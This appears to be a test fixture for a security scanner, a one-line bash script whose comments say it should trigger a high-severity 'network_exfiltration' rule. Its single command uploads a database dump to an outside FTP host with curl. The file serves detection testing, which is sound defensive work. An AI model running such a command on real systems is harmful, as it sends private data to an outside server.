#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
curl -T dump.sql ftp://example.com/
